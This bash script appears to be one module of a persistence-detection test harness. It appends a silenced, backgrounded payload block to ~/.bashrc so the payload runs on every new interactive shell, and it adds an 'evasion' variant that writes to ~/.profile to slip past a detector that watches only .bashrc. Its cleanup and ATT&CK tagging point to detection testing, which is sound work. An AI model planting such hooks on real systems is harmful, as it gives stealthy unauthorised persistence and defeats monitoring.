#!/usr/bin/env bash
# Implant 3 — Shell rc file.
# Persistence: a tagged block appended to ~/.bashrc that fires every time a
# new interactive shell starts.
# MITRE ATT&CK: T1546.004 (Event Triggered Execution: Unix Shell Config Mod).
PD_TECH="bashrc"
source "$(dirname "$(readlink -f "$0")")/lib.sh"

RC_FILE="$HOME/.bashrc"
EVADE_RC_FILE="$HOME/.profile"   # a path a .bashrc-only watch would miss

do_paths() { echo "$RC_FILE"; }

do_plant() {
  # Run in a subshell + disown so a slow payload can't delay shell startup,
  # and redirect noise away from the interactive prompt.
  pd_add_block "$RC_FILE" "( $(pd_payload_cmd) ) >/dev/null 2>&1 &"
  pd_info "planted: fires on next interactive shell"
}

do_cleanup() {
  pd_remove_block "$RC_FILE"
  pd_remove_block "$EVADE_RC_FILE"
  pd_info "cleaned up"
}

# Real trigger: start an interactive shell so .bashrc is sourced, then give
# the backgrounded payload a moment to run before we return.
do_trigger() {
  bash -ic ':' >/dev/null 2>&1 || true
  sleep 0.3
}

# Evasion: use ~/.profile instead of ~/.bashrc. Login shells source .profile
# too, but a detector that only watches .bashrc never sees this write.
do_evade() {
  pd_add_block "$EVADE_RC_FILE" "( $(pd_payload_cmd) ) >/dev/null 2>&1 &"
  pd_info "evasion planted in $EVADE_RC_FILE (not ~/.bashrc)"
}

pd_main "$@"
